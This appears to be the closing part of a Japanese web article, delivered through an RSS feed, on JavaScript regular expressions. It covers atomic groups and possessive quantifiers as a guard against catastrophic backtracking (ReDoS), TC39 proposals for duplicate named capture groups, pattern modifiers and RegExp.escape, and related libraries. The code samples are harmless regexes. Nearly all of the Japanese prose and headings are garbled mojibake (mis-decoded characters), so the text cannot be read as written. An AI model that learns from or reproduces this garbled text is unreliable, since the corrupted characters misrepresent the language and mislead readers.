<h2>ã‚¢ãƒˆãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã¨çµ¶å¯¾æœ€å¤§é‡æŒ‡å®šå­ã§ç ´å£Šçš„ãªãƒãƒƒã‚¯ãƒˆãƒ©ãƒƒã‚¯ã‚’å›é¿ã§ãã‚‹ <a href="#ã‚¢ãƒˆãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã¨çµ¶å¯¾æœ€å¤§é‡æŒ‡å®šå­ã§ç ´å£Šçš„ãªãƒãƒƒã‚¯ãƒˆãƒ©ãƒƒã‚¯ã‚’å›é¿ã§ãã‚‹">#</a><a name="ã‚¢ãƒˆãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã¨çµ¶å¯¾æœ€å¤§é‡æŒ‡å®šå­ã§ç ´å£Šçš„ãªãƒãƒƒã‚¯ãƒˆãƒ©ãƒƒã‚¯ã‚’å›é¿ã§ãã‚‹"></a></h2>
<p>ã‚¢ãƒˆãƒŸãƒƒã‚¯ã‚°ãƒ«ãƒ¼ãƒ—ã¨çµ¶å¯¾æœ€å¤§é‡æŒ‡å®šå­ã‚‚ã€<code class="language-text">regex</code>ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§è¿½åŠ ã•ã‚ŒãŸå¼·åŠ›ãªæ©Ÿèƒ½ã§ã™ã€‚ã“ã‚Œã‚‰ã¯ä¸»ã«ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã¨ç ´å£Šçš„ãªãƒãƒƒã‚¯ãƒˆãƒ©ãƒƒã‚¯ï¼ˆReDoSã¨ã‚‚å‘¼ã°ã‚Œã€ç‰¹å®šã®æ­£è¦è¡¨ç¾ãŒç‰¹å®šã®ã€ã‚ã¾ã‚Šä¸€è‡´ã—ãªã„æ–‡å­—åˆ—ã‚’æ¤œç´¢ã™ã‚‹éš›ã«è†¨å¤§ãªæ™‚é–“ãŒã‹ã‹ã‚‹æ·±åˆ»ãªå•é¡Œï¼‰ã«å¯¾ã™ã‚‹ãƒ¬ã‚¸ãƒªã‚¨ãƒ³ã‚¹ã«é–¢ã™ã‚‹æ©Ÿèƒ½ã§ã™ãŒã€ã‚ˆã‚Šå˜ç´”ãªãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’æ›¸ã‘ã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§å¯èª­æ€§ã‚‚æ”¹å–„ã—ã¾ã™ã€‚</p>
<p><strong>æ³¨</strong>ï¼šè©³ã—ãã¯<code class="language-text">regex</code>ã®<a href="https://github.com/slevithan/regex#atomic-groups">ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ</a>ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<h2>ä»Šå¾Œå®Ÿè£…ã•ã‚Œãã†ãªJavaScriptæ­£è¦è¡¨ç¾ã®æ”¹è‰¯ <a href="#ä»Šå¾Œå®Ÿè£…ã•ã‚Œãã†ãªJavaScriptæ­£è¦è¡¨ç¾ã®æ”¹è‰¯">#</a><a name="ä»Šå¾Œå®Ÿè£…ã•ã‚Œãã†ãªJavaScriptæ­£è¦è¡¨ç¾ã®æ”¹è‰¯"></a></h2>
<p>JavaScriptã®æ­£è¦è¡¨ç¾ã‚’æ”¹è‰¯ã™ã‚‹ãŸã‚ã®æ§˜ã€…ãªææ¡ˆãŒç¾åœ¨æ¤œè¨ã•ã‚Œã¦ã„ã¾ã™ã€‚JavaScriptã®å°†æ¥ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«çµ„ã¿è¾¼ã¾ã‚Œã‚‹è¦‹è¾¼ã¿ã®é«˜ã„3ã¤ã®ææ¡ˆã«ã¤ã„ã¦ä»¥ä¸‹ã«ã”ç´¹ä»‹ã—ã¾ã™ã€‚</p>
<h2>é‡è¤‡ã™ã‚‹åå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ã‚°ãƒ«ãƒ¼ãƒ— <a href="#é‡è¤‡ã™ã‚‹åå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ã‚°ãƒ«ãƒ¼ãƒ—">#</a><a name="é‡è¤‡ã™ã‚‹åå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ã‚°ãƒ«ãƒ¼ãƒ—"></a></h2>
<p>ã“ã‚Œã¯ã‚¹ãƒ†ãƒ¼ã‚¸3ï¼ˆæœ€çµ‚åŒ–é–“è¿‘ï¼‰ã®<a href="https://github.com/tc39/proposal-duplicate-named-capturing-groups">æ”¹è‰¯æ¡ˆ</a>ã§ã™ã€‚ã•ã‚‰ã«è‰¯ã„ã“ã¨ã«ã€ç›´è¿‘ã®æƒ…å ±ã«ã‚ˆã‚‹ã¨ã“ã®æ”¹è‰¯ã¯ã™ã¹ã¦ã®ä¸»è¦ãƒ–ãƒ©ã‚¦ã‚¶ã§æ©Ÿèƒ½ã—ã¾ã™ã€‚</p>
<p>åå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ãŒæœ€åˆã«å°å…¥ã•ã‚ŒãŸéš›ã€ã™ã¹ã¦ã®<code class="language-text">(?&lt;name>...)</code>ã‚­ãƒ£ãƒ—ãƒãƒ£ã§ä¸€æ„ã®åå‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒæ±‚ã‚ã‚‰ã‚Œã¾ã—ãŸã€‚ã—ã‹ã—ã€æ­£è¦è¡¨ç¾ã«ã¯è¤‡æ•°ã®ä»£æ›¿ãƒ‘ã‚¹ãŒã‚ã‚‹å ´åˆã‚‚ã‚ã‚Šã€ãã‚Œãã‚Œã®ãƒ‘ã‚¹ã§åŒã˜ã‚°ãƒ«ãƒ¼ãƒ—åã‚’ä½¿ç”¨ã—ãŸæ–¹ãŒã‚³ãƒ¼ãƒ‰ã‚’å˜ç´”åŒ–ã§ãã¾ã™ã€‚</p>
<p>ä»¥ä¸‹ã®ä¾‹ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;year>\d{4})-\d\d|\d\d-(?&lt;year>\d{4})</span><span class="token regex-delimiter">/</span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>ã“ã®æ”¹è‰¯æ¡ˆã¯ã€ã¾ã•ã«ã“ã®ä¾‹ã®æ§‹æ–‡ã‚’å¯èƒ½ã«ã™ã‚‹ã‚‚ã®ã§ã€ã“ã®ã‚ˆã†ãªæ§‹æ–‡ã§ã€Œé‡è¤‡ã™ã‚‹ã‚­ãƒ£ãƒ—ãƒãƒ£ã‚°ãƒ«ãƒ¼ãƒ—åã€ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹ã®ã‚’é˜²ãã¾ã™ã€‚ãŸã ã—ã€å„ä»£æ›¿ãƒ‘ã‚¹ã®ä¸­ã§ã¯å¼•ãç¶šãä¸€æ„ã®åå‰ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
<h2>ãƒ‘ã‚¿ãƒ¼ãƒ³ä¿®é£¾å­ï¼ˆåˆ¥åï¼šãƒ•ãƒ©ã‚°ã‚°ãƒ«ãƒ¼ãƒ—ï¼‰ <a href="#ãƒ‘ã‚¿ãƒ¼ãƒ³ä¿®é£¾å­ï¼ˆåˆ¥åï¼šãƒ•ãƒ©ã‚°ã‚°ãƒ«ãƒ¼ãƒ—ï¼‰">#</a><a name="ãƒ‘ã‚¿ãƒ¼ãƒ³ä¿®é£¾å­ï¼ˆåˆ¥åï¼šãƒ•ãƒ©ã‚°ã‚°ãƒ«ãƒ¼ãƒ—ï¼‰"></a></h2>
<p>ã“ã¡ã‚‰ã‚‚ã‚¹ãƒ†ãƒ¼ã‚¸3ã®<a href="https://github.com/tc39/proposal-regexp-modifiers">æ”¹è‰¯æ¡ˆ</a>ã§ã™ã€‚Chrome/Edge 125ãŠã‚ˆã³Opera 111ã§ã¯ã™ã§ã«ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ãŠã‚Šã€<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1899813">è¿‘ã€…</a>Firefoxã§ã‚‚ã‚µãƒãƒ¼ãƒˆã•ã‚Œã‚‹äºˆå®šã§ã™ã€‚Safariã«ã¤ã„ã¦ã¯<a href="https://bugs.webkit.org/show_bug.cgi?id=275672">ä»Šã®ã¨ã“ã‚</a>ä¸æ˜ã§ã™ã€‚</p>
<p>ãƒ‘ã‚¿ãƒ¼ãƒ³ä¿®é£¾å­ã¯<code class="language-text">(?ims:...)</code>ã€<code class="language-text">(?-ims:...)</code>ã€<code class="language-text">(?im-s:...)</code>ã®ã„ãšã‚Œã‹ã‚’ä½¿ç”¨ã—ã€æ­£è¦è¡¨ç¾ã®ç‰¹å®šã®éƒ¨åˆ†ã®ã¿ã«ã¤ã„ã¦<code class="language-text">i</code>ã€<code class="language-text">m</code>ã€<code class="language-text">s</code>ãƒ•ãƒ©ã‚°ã®ã‚ªãƒ³ã¨ã‚ªãƒ•ã‚’åˆ‡ã‚Šæ›¿ãˆã¾ã™ã€‚</p>
<p>ä»¥ä¸‹ã®ä¾‹ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">hello-(?i:world)</span><span class="token regex-delimiter">/</span></span>
<span class="token comment">// Matches 'hello-WORLD' but not 'HELLO-WORLD'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<h2><code class="language-text">RegExp.escape</code>ã«ã‚ˆã‚‹æ­£è¦è¡¨ç¾ã®ç‰¹æ®Šæ–‡å­—ã®ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç† <a href="#RegExp.escapeã«ã‚ˆã‚‹æ­£è¦è¡¨ç¾ã®ç‰¹æ®Šæ–‡å­—ã®ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†">#</a><a name="RegExp.escapeã«ã‚ˆã‚‹æ­£è¦è¡¨ç¾ã®ç‰¹æ®Šæ–‡å­—ã®ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†"></a></h2>
<p>ã“ã®<a href="https://github.com/tc39/proposal-regex-escaping">æ”¹è‰¯æ¡ˆ</a>ã¯ã€é•·ã„æ™‚é–“ã‚’çµŒã¦ã‚ˆã†ã‚„ãæœ€è¿‘ã‚¹ãƒ†ãƒ¼ã‚¸3ã«åˆ°é”ã—ã¾ã—ãŸã€‚ã¾ã ã©ã®ä¸»è¦ãƒ–ãƒ©ã‚¦ã‚¶ã‚‚å¯¾å¿œã—ã¦ã„ã¾ã›ã‚“ã€‚è¬³ã„æ–‡å¥ã©ãŠã‚Š<code class="language-text">RegExp.escape(str)</code>é–¢æ•°ã‚’æä¾›ã™ã‚‹ã“ã¨ã§ã€æ­£è¦è¡¨ç¾ã®ç‰¹æ®Šæ–‡å­—ãŒã™ã¹ã¦ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã•ã‚ŒãŸçŠ¶æ…‹ã§æ–‡å­—åˆ—ã‚’è¿”ã—ã€ãƒªãƒ†ãƒ©ãƒ«æ–‡å­—åˆ—ã¨ã—ã¦ãƒãƒƒãƒãƒ³ã‚°ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚</p>
<p>ã“ã®æ©Ÿèƒ½ãŒã™ãã«å¿…è¦ãªå ´åˆã€<a href="https://github.com/sindresorhus/escape-string-regexp">escape-string-regexp</a>ãŒæœ€ã‚‚åºƒãä½¿ã‚ã‚Œã¦ã„ã‚‹ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã§ã™ï¼ˆæ¯æœˆ5å„„å›ä»¥ä¸Šãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã¾ã™ï¼‰ã€‚ã“ã®npmãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã¯ã€æœ€ä½é™ã®ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’è¡Œã†è¶…è»½é‡ã®å°‚ç”¨ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ã§ã™ã€‚ã»ã¨ã‚“ã©ã®ã‚±ãƒ¼ã‚¹ã§ã¯ã“ã‚Œã§ååˆ†ã§ã™ãŒã€ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’è¡Œã£ãŸæ–‡å­—åˆ—ãŒæ­£è¦è¡¨ç¾å†…ã®ã©ã®ä½ç½®ã§ã‚‚å®‰å…¨ã«ä½¿ç”¨ã§ãã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã€<code class="language-text">escape-string-regexp</code>ã¯ã“ã®è¨˜äº‹ã§ã™ã§ã«ç´¹ä»‹ã—ãŸ<code class="language-text">regex</code>ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’æ¨å¥¨ã—ã¦ã„ã¾ã™ã€‚<code class="language-text">regex</code>ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯ã€åŸ‹ã‚è¾¼ã¿æ–‡å­—åˆ—ã®ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã‚’è£œé–“ã«ã‚ˆã‚Šã€<a href="https://github.com/slevithan/regex#interpolating-escaped-strings">ã‚³ãƒ³ãƒ†ã‚¯ã‚¹ãƒˆã‚’æ„è­˜ã—ãŸæ–¹æ³•</a>ã§è¡Œã„ã¾ã™ã€‚</p>
<h2>ã¾ã¨ã‚ <a href="#ã¾ã¨ã‚">#</a><a name="ã¾ã¨ã‚"></a></h2>
<p>ã“ã®è¨˜äº‹ã§ã¯ã€JavaScriptã®æ­£è¦è¡¨ç¾ã®éå»ã€ç¾åœ¨ã€ãã—ã¦æœªæ¥ã«ã¤ã„ã¦ãŠè©±ã—ã¾ã—ãŸã€‚</p>
<p>æ­£è¦è¡¨ç¾ã«ã¤ã„ã¦ã•ã‚‰ã«è©³ã—ãå­¦ã³ãŸã„æ–¹ã¯ã€<a href="https://github.com/slevithan/awesome-regex">Awesome Regex</a>ã«å„ªã‚ŒãŸæ­£è¦è¡¨ç¾ãƒ†ã‚¹ã‚¿ãƒ¼ã€ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã€ãã®ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ãŒç´¹ä»‹ã•ã‚Œã¦ã„ã‚‹ã®ã§ãœã²ã”è¦§ãã ã•ã„ã€‚æ­£è¦è¡¨ç¾ã®ã‚¯ãƒ­ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ‘ã‚ºãƒ«ã«æŒ‘æˆ¦ã—ã¦ã¿ãŸã„æ–¹ã¯ã€<a href="https://regexle.com/">regexle</a>ã‚’ãŠè©¦ã—ãã ã•ã„ã€‚</p>
<p>çš†ã•ã‚“ã®å®Ÿã‚Šã‚ã‚‹æ§‹æ–‡è§£æã¨æ­£è¦è¡¨ç¾ã®å¯èª­æ€§å‘ä¸Šã®ä¸€åŠ©ã«ãªã‚Œã°å¹¸ã„ã§ã™ã€‚</p>]]></content:encoded></item></channel></rss>